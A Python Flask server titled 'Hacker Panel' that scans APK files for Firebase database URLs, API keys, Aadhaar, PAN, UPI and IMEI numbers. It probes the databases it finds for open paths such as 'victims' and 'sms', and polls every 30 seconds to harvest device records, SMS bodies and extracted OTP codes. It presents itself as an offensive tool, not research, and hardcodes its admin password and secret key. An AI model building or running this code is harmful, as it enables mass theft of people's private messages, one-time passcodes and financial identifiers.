#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hacker Panel — Unified Server
Combines: APK Scanner + Firebase Extractor + Device Poller + Admin
Port 5001 | Admin: /admin | Password: Tanmay1122@
"""

from flask import Flask, request, jsonify, session, redirect, send_from_directory
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor, as_completed
import zipfile, re, io, json, os, time, threading, uuid, hashlib
from datetime import datetime

try:
    import requests as _req
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    _S = _req.Session()
    _S.mount('https://', HTTPAdapter(pool_connections=80, pool_maxsize=200, max_retries=Retry(total=0)))
    _S.mount('http://',  HTTPAdapter(pool_connections=80, pool_maxsize=200, max_retries=Retry(total=0)))
    _S.headers['User-Agent'] = 'Mozilla/5.0'
    def hget(url, t=3):
        return _S.get(url, timeout=t)
except ImportError:
    import urllib.request
    class _R:
        def __init__(self, c, b=b''):
            self.status_code = c
            self._b = b
        def json(self): return json.loads(self._b)
    def hget(url, t=3):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'}), timeout=t)
            return _R(r.getcode(), r.read())
        except Exception as e:
            code = getattr(e, 'code', 503)
            return _R(code)

# ─────────────────────────────────────────────────────────────────────────────
app = Flask(__name__, static_folder='.')
CORS(app)
app.secret_key = 'HackerPanel_Unified_9x!@#2025'
app.config['MAX_CONTENT_LENGTH'] = 300 * 1024 * 1024
ADMIN_PWD = 'Tanmay1122@'
DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(DIR, 'panel_state.json')
UPLOAD_DIR = os.path.join(DIR, 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ─────────────────────────────────────────────────────────────────────────────
# REGEX
RE_API  = re.compile(r'AIza[a-zA-Z0-9_\-]{35}')
RE_APID = re.compile(r'1:[0-9]+:(?:android|ios|web):[a-f0-9]+')
RE_DBURL= re.compile(r'https://[a-z0-9\-]+\.(?:firebaseio\.com|firebasedatabase\.app)')
RE_SEC  = re.compile(r'(?i)(?:password|passwd|secret|token|auth_key)[\s]*[:=][\s]*["\']([^"\']{4,})["\']')
RE_PH   = re.compile(r'\+?(?:91|92|880|977|94|1)\d{9,12}|(?<!\d)(?:6|7|8|9)\d{9}(?!\d)')
RE_OTP  = re.compile(r'(?:OTP|otp|code|verify)[:\s#\-]*(\d{4,8})', re.I)
RE_IMEI = re.compile(r'(?<!\d)\d{15}(?!\d)')
RE_MAIL = re.compile(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}')
RE_STG  = re.compile(r'gs://[a-z0-9\-]+\.appspot\.com')
RE_SIM  = re.compile(r'89\d{17,19}')
RE_ADH  = re.compile(r'(?<!\d)\d{4}\s?\d{4}\s?\d{4}(?!\d)')
RE_PAN  = re.compile(r'[A-Z]{5}\d{4}[A-Z]')
RE_UPI  = re.compile(r'[\w.\-]+@(?:paytm|upi|oksbi|okhdfcbank|okicici|okaxis|ybl|apl|ibl|sbi)\b', re.I)
RE_JWT  = re.compile(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}')
RE_IP   = re.compile(r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b')

SKIP_EXT = ('.png','.jpg','.jpeg','.gif','.mp3','.mp4','.webp','.ogg',
            '.ttf','.woff','.wav','.3gp','.arsc','.dex','.so','.class',
            '.kotlin_module','.proto','.realm')

PROBE_PATHS = [
    '','clients','All_Users','All_Users/simDetails','All_Users/Data/DeviceInfo',
    'users','user_data','UserData','userData','device','devices','bots','panel',
    'messages','Messages','sms','SMS','user_sms','inbox','sent','outbox','chat',
    'data','Data','results','info','Ede','admin','logs','events',
    'sims','simInfo','sim_data','registered','online','offline','active',
    'victims','targets','clients_data','Numbers',
]

# ─────────────────────────────────────────────────────────────────────────────
# STATE MANAGER
# ─────────────────────────────────────────────────────────────────────────────
_lock = threading.RLock()

def _default_state():
    return {
        'firebase_urls': [],        # [{url, auth, label, added}]
        'devices': {},              # {device_key: device_dict}
        'pinned': [],               # [device_key]
        'wishes': {},               # {device_key: wish_str}
        'last_wishes': {},          # {device_key: last_activity_str}
        'sms_cache': {},            # {device_key: [sms]}
        'stats': {'total':0,'online':0,'offline':0,'sms':0,'phones':0},
        'upload_log': [],           # [{file, ts, findings}]
        'auto_discovered': [],      # [url] found via APK scan
    }

def load_state():
    try:
        with open(STATE_FILE, 'r', encoding='utf-8') as f:
            s = json.load(f)
        # merge missing keys
        d = _default_state()
        d.update(s)
        return d
    except Exception:
        return _default_state()

def save_state(state):
    try:
        with open(STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(state, f, ensure_ascii=False, indent=2, default=str)
    except Exception:
        pass

STATE = load_state()

# ─────────────────────────────────────────────────────────────────────────────
# FIREBASE PROBING
# ─────────────────────────────────────────────────────────────────────────────

def probe_path(base, path, auth=''):
    qs = '?shallow=true'
    if auth and auth.lower() not in ('','public','none'):
        qs += f'&auth={auth}'
    url = (f"{base}/{path}.json" if path else f"{base}/.json") + qs
    try:
        r = hget(url, 3)
        if r.status_code == 200:
            d = r.json()
            if d is None: return None, url
            return d, url
    except Exception:
        pass
    return None, url

def device_key(d):
    k = (d.get('phone','') or d.get('imei','') or d.get('id','') or
         d.get('androidId','') or d.get('name','') or str(uuid.uuid4()))
    return hashlib.md5(k.encode()).hexdigest()[:12]

def extract_from_data(obj, src_url='', path=''):
    devs, smses, phones = [], [], []
    def _w(o, p=''):
        if isinstance(o, dict):
            ks = {k.lower() for k in o}
            # SMS
            if any(k in ks for k in ['body','message','msg','text','sms']):
                body = o.get('body') or o.get('message') or o.get('msg') or o.get('text','')
                sender = o.get('address') or o.get('sender') or o.get('number') or o.get('from','Unknown')
                ts = o.get('date') or o.get('timestamp') or o.get('time',0)
                otp = None
                m = RE_OTP.search(str(body))
                if m: otp = m.group(1)
                if str(body).strip():
                    smses.append({'body':str(body)[:400],'sender':str(sender),
                                  'ts':str(ts),'otp':otp,'src':src_url,'path':p})
            # Device
            if any(k in ks for k in ['mobno','mobile','phonenumber','phone','imei',
                                       'deviceid','androidid','model','brand']):
                ph = (o.get('mobNo') or o.get('mobile') or o.get('phoneNumber') or
                      o.get('phone') or o.get('number') or o.get('mobno',''))
                imei  = o.get('imei') or o.get('IMEI','')
                model = o.get('model') or o.get('Model') or o.get('brand') or o.get('deviceModel','')
                name  = o.get('name') or o.get('Name') or o.get('deviceName','')
                online= bool(o.get('status') or o.get('online') or o.get('isOnline',False))
                # SIM
                sims = o.get('sims') or o.get('simDetails') or o.get('simInfo') or {}
                sim_phs = []
                if isinstance(sims, list):
                    sim_phs = [s.get('phoneNumber','') for s in sims if isinstance(s,dict)]
                elif isinstance(sims, dict):
                    sim_phs = [v.get('phoneNumber','') for v in sims.values() if isinstance(v,dict)]
                if not ph and sim_phs: ph = sim_phs[0]
                bat = o.get('battery') or o.get('batteryLevel','')
                try: bat = int(str(bat).replace('%',''))
                except: bat = None
                lastSeen = o.get('lastSeen') or o.get('last_seen') or o.get('lastActive','')
                if ph or imei or model:
                    dev = {'phone':str(ph),'imei':str(imei),'model':str(model),'name':str(name),
                           'online':online,'battery':bat,'sims':sim_phs,
                           'src':src_url,'path':p,'lastSeen':str(lastSeen),
                           'updated':int(time.time())}
                    devs.append(dev)
            for v in o.values():
                if isinstance(v, str): phones.extend(RE_PH.findall(v))
            for k,v in o.items(): _w(v, f'{p}.{k}')
        elif isinstance(o, list):
            for i,item in enumerate(o): _w(item, f'{p}[{i}]')
    _w(obj, path)
    return devs, smses, list(set(phones))

def probe_firebase(base_url, auth=''):
    base = base_url.rstrip('/').rstrip('.json')
    result = {'url':base,'endpoints':[],'devices':[],'sms':[],'phones':[],'vulnerable':False}
    with ThreadPoolExecutor(max_workers=60) as ex:
        futs = {ex.submit(probe_path, base, p, auth): p for p in PROBE_PATHS}
        for fut in as_completed(futs):
            path = futs[fut]
            try:
                data, url = fut.result()
                if data is None: continue
                result['vulnerable'] = True
                cnt = len(data) if isinstance(data,(dict,list)) else 1
                result['endpoints'].append({'path': path or '/', 'count': cnt, 'url': url})
                devs, smses, phs = extract_from_data(data, base, path)
                result['devices'].extend(devs)
                result['sms'].extend(smses)
                result['phones'].extend(phs)
            except Exception: continue
    result['phones'] = list(set(result['phones']))
    # dedup devices
    seen, dd = set(), []
    for d in result['devices']:
        k = (d['phone'], d['imei'])
        if k not in seen: seen.add(k); dd.append(d)
    result['devices'] = dd
    return result

# ─────────────────────────────────────────────────────────────────────────────
# BACKGROUND FIREBASE POLLER
# ─────────────────────────────────────────────────────────────────────────────

def _merge_devices(probe_result):
    """Merge probe result into global STATE devices."""
    with _lock:
        for dev in probe_result.get('devices', []):
            k = device_key(dev)
            existing = STATE['devices'].get(k, {})
            # preserve pinned & wish
            dev['pinned'] = existing.get('pinned', False)
            dev['wish'] = STATE['wishes'].get(k, '')
            dev['key'] = k
            # compute last activity
            sms_for_dev = [s for s in probe_result.get('sms', [])
                           if s.get('sender','') == dev.get('phone','') or
                              any(s.get('sender','') in sim for sim in dev.get('sims',[]))]
            if sms_for_dev:
                dev['last_sms'] = sms_for_dev[-1]
                STATE['sms_cache'][k] = sms_for_dev
            else:
                dev['last_sms'] = existing.get('last_sms')
            STATE['devices'][k] = dev
        # add orphan SMS phones
        for ph in probe_result.get('phones', []):
            ph_clean = str(ph).strip()
            if not ph_clean: continue
            k2 = hashlib.md5(ph_clean.encode()).hexdigest()[:12]
            if k2 not in STATE['devices']:
                STATE['devices'][k2] = {
                    'phone': ph_clean, 'imei':'','model':'','name':'',
                    'online': False, 'battery': None, 'sims': [], 'wish':'',
                    'pinned': False, 'key': k2, 'src': probe_result.get('url',''),
                    'updated': int(time.time()), 'last_sms': None, 'lastSeen':'',
                }

def poll_loop():
    while True:
        try:
            with _lock:
                urls = list(STATE['firebase_urls'])
            if urls:
                def _poll_one(entry):
                    try:
                        r = probe_firebase(entry['url'], entry.get('auth',''))
                        _merge_devices(r)
                        _update_stats()
                    except Exception: pass
                with ThreadPoolExecutor(max_workers=min(20, len(urls))) as ex:
                    list(ex.map(_poll_one, urls))
                with _lock:
                    save_state(STATE)
        except Exception: pass
        time.sleep(30)

def _update_stats():
    with _lock:
        devs = STATE['devices']
        on = sum(1 for d in devs.values() if d.get('online'))
        STATE['stats'] = {
            'total': len(devs),
            'online': on,
            'offline': len(devs) - on,
            'sms': sum(len(v) for v in STATE['sms_cache'].values()),
            'phones': len(devs),
            'pinned': sum(1 for d in devs.values() if d.get('pinned')),
        }

# Start poller
_poll_thread = threading.Thread(target=poll_loop, daemon=True)
_poll_thread.start()

# ─────────────────────────────────────────────────────────────────────────────
# APK SCANNER
# ─────────────────────────────────────────────────────────────────────────────

def _scan_file(raw):
    try:
        c = raw.decode('utf-8', errors='ignore')
        loc = {
            'API Keys': set(RE_API.findall(c)),
            'App IDs':  set(RE_APID.findall(c)),
            'DB URLs':  set(RE_DBURL.findall(c)),
            'Storage':  set(RE_STG.findall(c)),
            'Emails':   set(RE_MAIL.findall(c)),
            'Phones':   set(RE_PH.findall(c)),
            'SIM':      set(RE_SIM.findall(c)),
            'IMEI':     set(RE_IMEI.findall(c)),
            'Aadhaar':  set(RE_ADH.findall(c)),
            'PAN':      set(RE_PAN.findall(c)),
            'UPI':      set(RE_UPI.findall(c)),
            'JWT':      set(RE_JWT.findall(c)),
            'IPs':      set(RE_IP.findall(c)),
            'Secrets':  set(),
        }
        for m in RE_SEC.finditer(c):
            v = m.group(1)
            if len(v) > 3 and v not in ('true','false','null','undefined'):
                loc['Secrets'].add(v)
        return loc
    except Exception:
        return None

def scan_apk(apk_bytes, fname='file.apk'):
    findings = {k: set() for k in ('API Keys','App IDs','DB URLs','Storage','Emails',
                                    'Phones','SIM','IMEI','Aadhaar','PAN','UPI','JWT',
                                    'IPs','Secrets')}
    findings['files_scanned'] = 0
    findings['total_files'] = 0
    try:
        with zipfile.ZipFile(io.BytesIO(apk_bytes), 'r') as z:
            all_fi = z.infolist()
            findings['total_files'] = len(all_fi)
            tasks = []
            for fi in all_fi:
                fn = fi.filename.lower()
                if any(fn.endswith(e) for e in SKIP_EXT): continue
                try: tasks.append(z.read(fi))
                except Exception: continue
            findings['files_scanned'] = len(tasks)
            with ThreadPoolExecutor(max_workers=min(32, len(tasks) or 1)) as ex:
                for res in ex.map(_scan_file, tasks):
                    if res:
                        for k in set(findings.keys()) - {'files_scanned','total_files'}:
                            if k in res: findings[k].update(res[k])
    except zipfile.BadZipFile:
        return None, f'Not a valid APK ({len(apk_bytes):,} bytes)'
    except Exception as e:
        return None, f'Parse error: {e}'
    out = {k: sorted(list(v)) if isinstance(v,set) else v for k,v in findings.items()}
    return out, None

def auto_add_firebase_urls(urls, label_prefix='APK'):
    """Auto-add discovered Firebase URLs to monitoring list."""
    added = []
    with _lock:
        existing = {e['url'] for e in STATE['firebase_urls']}
        for url in urls:
            url = url.rstrip('/').rstrip('.json')
            if url not in existing:
                entry = {'url': url, 'auth': '', 'label': label_prefix, 'added': int(time.time())}
                STATE['firebase_urls'].append(entry)
                STATE['auto_discovered'].append(url)
                existing.add(url)
                added.append(url)
        if added: save_state(STATE)
    return added

# ─────────────────────────────────────────────────────────────────────────────
# FILE EXTRACTOR (general files: JSON, TXT, DB, etc.)
# ─────────────────────────────────────────────────────────────────────────────

def extract_file(raw_bytes, fname=''):
    text = raw_bytes.decode('utf-8', errors='ignore')
    out = {
        'phones': list(set(RE_PH.findall(text))),
        'otps':   [m.group(1) for m in RE_OTP.finditer(text)],
        'emails': list(set(RE_MAIL.findall(text))),
        'imeis':  list(set(RE_IMEI.findall(text))),
        'db_urls': list(set(RE_DBURL.findall(text))),
        'api_keys': list(set(RE_API.findall(text))),
        'upi':    list(set(RE_UPI.findall(text))),
        'sms_records': [], 'device_records': [],
    }
    # Try JSON deep extraction
    try:
        data = json.loads(text)
        devs, smses, phs = extract_from_data(data)
        out['device_records'] = devs[:200]
        out['sms_records'] = smses[:200]
        out['phones'] = list(set(out['phones'] + phs))
        # auto-add Firebase URLs from JSON
        auto_add_firebase_urls(out['db_urls'], 'JSON')
    except Exception: pass
    return out

# ─────────────────────────────────────────────────────────────────────────────
# ROUTES — MAIN PANEL
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_from_directory(DIR, 'panel.html')

@app.route('/panel.html')
def panel_html():
    return send_from_directory(DIR, 'panel.html')

@app.route('/<path:fname>')
def static_files(fname):
    return send_from_directory(DIR, fname)

# ─────────────────────────────────────────────────────────────────────────────
# ROUTES — API
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/api/state')
def api_state():
    with _lock:
        _update_stats()
        devs = dict(STATE['devices'])
        urls = list(STATE['firebase_urls'])
        stats = dict(STATE['stats'])
        pinned = list(STATE['pinned'])
    return jsonify({'devices': devs, 'firebase_urls': urls,
                    'stats': stats, 'pinned': pinned})

@app.route('/api/devices')
def api_devices():
    with _lock:
        _update_stats()
        devs = list(STATE['devices'].values())
        stats = dict(STATE['stats'])
    online  = sorted([d for d in devs if d.get('online')],
                     key=lambda d: (not d.get('pinned'), d.get('name','').lower()))
    offline = sorted([d for d in devs if not d.get('online')],
                     key=lambda d: (not d.get('pinned'), d.get('updated',0)), reverse=False)
    offline.sort(key=lambda d: (not d.get('pinned')))
    return jsonify({'online': online, 'offline': offline, 'stats': stats})

@app.route('/api/firebase/add', methods=['POST'])
def api_fb_add():
    data = request.get_json() or {}
    url  = (data.get('url','') or '').strip().rstrip('/').rstrip('.json')
    auth = (data.get('auth','') or '').strip()
    label= (data.get('label','') or 'Manual').strip()
    if not url:
        return jsonify({'error': 'URL required'}), 400
    with _lock:
        existing = {e['url'] for e in STATE['firebase_urls']}
        if url in existing:
            return jsonify({'status': 'already_exists'})
        STATE['firebase_urls'].append({'url':url,'auth':auth,'label':label,'added':int(time.time())})
        save_state(STATE)
    # Immediately probe in background
    threading.Thread(target=lambda: (
        _merge_devices(probe_firebase(url, auth)),
        _update_stats(),
        save_state(STATE)
    ), daemon=True).start()
    return jsonify({'status': 'added', 'url': url})

@app.route('/api/firebase/remove', methods=['POST'])
def api_fb_remove():
    data = request.get_json() or {}
    url  = (data.get('url','') or '').strip()
    with _lock:
        STATE['firebase_urls'] = [e for e in STATE['firebase_urls'] if e['url'] != url]
        save_state(STATE)
    return jsonify({'status': 'removed'})

@app.route('/api/firebase/probe', methods=['POST'])
def api_fb_probe():
    data = request.get_json() or {}
    url  = (data.get('url','') or '').strip()
    auth = (data.get('auth','') or '').strip()
    if not url: return jsonify({'error':'URL required'}), 400
    result = probe_firebase(url, auth)
    _merge_devices(result)
    _update_stats()
    save_state(STATE)
    return jsonify(result)

@app.route('/api/firebase/list')
def api_fb_list():
    with _lock:
        return jsonify({'urls': STATE['firebase_urls']})

@app.route('/api/device/pin', methods=['POST'])
def api_pin():
    data = request.get_json() or {}
    k = data.get('key','')
    with _lock:
        if k in STATE['devices']:
            STATE['devices'][k]['pinned'] = not STATE['devices'][k].get('pinned', False)
            if STATE['devices'][k]['pinned']:
                if k not in STATE['pinned']: STATE['pinned'].append(k)
            else:
                STATE['pinned'] = [x for x in STATE['pinned'] if x != k]
            save_state(STATE)
            return jsonify({'pinned': STATE['devices'][k]['pinned']})
    return jsonify({'error': 'device not found'}), 404

@app.route('/api/device/wish', methods=['POST'])
def api_wish():
    data = request.get_json() or {}
    k    = data.get('key','')
    wish = data.get('wish','')
    with _lock:
        STATE['wishes'][k] = wish
        if k in STATE['devices']:
            STATE['devices'][k]['wish'] = wish
        save_state(STATE)
    return jsonify({'status': 'ok'})

@app.route('/api/device/sms/<key>')
def api_device_sms(key):
    with _lock:
        msgs = STATE['sms_cache'].get(key, [])
    return jsonify({'sms': msgs})

@app.route('/api/upload', methods=['POST'])
def api_upload():
    f = request.files.get('file') or request.files.get('apk')
    if not f: return jsonify({'error': 'no file'}), 400
    raw = f.read()
    fname = f.filename.lower()
    result = {'filename': f.filename, 'size': len(raw)}

    if fname.endswith('.apk'):
        findings, err = scan_apk(raw, f.filename)
        if err: return jsonify({'error': err}), 400
        # Auto-add discovered Firebase URLs
        added = auto_add_firebase_urls(findings.get('DB URLs', []), f'APK:{f.filename}')
        result['extraction'] = findings
        result['auto_added_firebase'] = added
        result['type'] = 'apk'
        # Fire probe on newly added URLs
        for url in added:
            threading.Thread(target=lambda u=url: (
                _merge_devices(probe_firebase(u)),
                _update_stats(),
                save_state(STATE)
            ), daemon=True).start()
    else:
        ext = extract_file(raw, f.filename)
        added = auto_add_firebase_urls(ext.get('db_urls', []), f'File:{f.filename}')
        result['extraction'] = ext
        result['auto_added_firebase'] = added
        result['type'] = 'file'

    with _lock:
        STATE['upload_log'].append({
            'file': f.filename, 'ts': int(time.time()), 'size': len(raw),
            'auto_added': len(result.get('auto_added_firebase',[])),
        })
        if len(STATE['upload_log']) > 100:
            STATE['upload_log'] = STATE['upload_log'][-100:]
        save_state(STATE)
    return jsonify(result)

@app.route('/api/stats')
def api_stats():
    with _lock:
        _update_stats()
        return jsonify(STATE['stats'])

@app.route('/api/poll_now', methods=['POST'])
def api_poll_now():
    """Force immediate poll of all Firebase URLs."""
    def _do():
        with _lock: urls = list(STATE['firebase_urls'])
        with ThreadPoolExecutor(max_workers=min(20,len(urls) or 1)) as ex:
            def _p(e):
                r = probe_firebase(e['url'], e.get('auth',''))
                _merge_devices(r)
            list(ex.map(_p, urls))
        _update_stats()
        save_state(STATE)
    threading.Thread(target=_do, daemon=True).start()
    return jsonify({'status': 'polling', 'urls': len(STATE['firebase_urls'])})

@app.route('/api/clear', methods=['POST'])
def api_clear():
    with _lock:
        STATE['devices'] = {}
        STATE['sms_cache'] = {}
        _update_stats()
        save_state(STATE)
    return jsonify({'status': 'cleared'})

# ─────────────────────────────────────────────────────────────────────────────
# ROUTES — ADMIN (APK SCANNER)
# ─────────────────────────────────────────────────────────────────────────────

def admin_req(f):
    from functools import wraps
    @wraps(f)
    def w(*a,**kw):
        if not session.get('admin'): return redirect('/admin')
        return f(*a,**kw)
    return w

@app.route('/admin', methods=['GET','POST'])
def admin_login():
    if session.get('admin'): return redirect('/admin/scanner')
    err = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PWD:
            session['admin'] = True
            return redirect('/admin/scanner')
        err = 'Wrong password'
    return f"""<!DOCTYPE html><html><head><title>Admin</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet"/>
<style>*{{margin:0;padding:0;box-sizing:border-box;}}
body{{background:#050709;color:#c8e8f0;font-family:Rajdhani,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}}
.card{{background:#080c10;border:1px solid rgba(0,229,255,.18);border-radius:18px;padding:40px;width:400px;position:relative;overflow:hidden;}}
.card::before{{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#ff2244,#00e5ff,#ff2244);animation:sh 3s ease infinite;background-size:400%;border-radius:18px 18px 0 0;}}
@keyframes sh{{0%{{background-position:0 50%}}50%{{background-position:100% 50%}}100%{{background-position:0 50%}}}}
h1{{font-family:'Orbitron',monospace;font-size:24px;text-align:center;margin-bottom:20px;background:linear-gradient(90deg,#00e5ff,#ff2244);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
input{{width:100%;padding:12px;background:#0c1118;border:1px solid rgba(0,229,255,.12);border-radius:9px;color:#c8e8f0;font-size:13px;outline:none;margin-bottom:14px;}}
input:focus{{border-color:#00e5ff;}}
button{{width:100%;padding:13px;border:none;border-radius:10px;color:#020810;font-family:'Orbitron',monospace;font-size:13px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,#33ecff,#00e5ff);}}
.err{{color:#ff4466;font-size:12px;text-align:center;margin-top:8px;}}
</style></head><body><div class="card"><div style="font-size:60px;text-align:center;margin-bottom:12px;">🔥</div>
<h1>Admin Access</h1>
<form method="POST"><input type="password" name="password" placeholder="Enter password" autofocus/>
<button type="submit">UNLOCK</button></form>
{'<div class="err">'+err+'</div>' if err else ''}
</div></body></html>"""

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect('/admin')

@app.route('/admin/scanner')
@admin_req
def admin_scanner():
    return send_from_directory(DIR, 'apk_scanner.html')

@app.route('/admin/scan', methods=['POST'])
@admin_req
def admin_scan():
    f = request.files.get('apk')
    if not f or not f.filename.lower().endswith('.apk'):
        return jsonify({'error': 'APK only'}), 400
    raw = f.read()
    findings, err = scan_apk(raw, f.filename)
    if err: return jsonify({'error': err}), 400
    # Auto-probe Firebase
    added = auto_add_firebase_urls(findings.get('DB URLs',[]), f'APK:{f.filename}')
    probes = {}
    if findings.get('DB URLs'):
        with ThreadPoolExecutor(max_workers=10) as ex:
            futs = {ex.submit(probe_firebase, url): url for url in findings['DB URLs']}
            for fut in as_completed(futs):
                url = futs[fut]
                try:
                    r = fut.result()
                    _merge_devices(r)
                    probes[url] = r
                except Exception as e:
                    probes[url] = {'url':url,'error':str(e),'vulnerable':False,
                                   'endpoints':[],'devices':[],'sms':[],'phones':[]}
    _update_stats()
    save_state(STATE)
    return jsonify({'filename':f.filename,'findings':findings,
                    'firebase_probes':probes,'auto_added':added})

# ─────────────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    print('='*55)
    print('  Hacker Panel — Unified Server')
    print('  Main Panel : http://0.0.0.0:5001/')
    print('  Admin      : http://0.0.0.0:5001/admin')
    print('  Password   : Tanmay1122@')
    print('='*55)
    app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
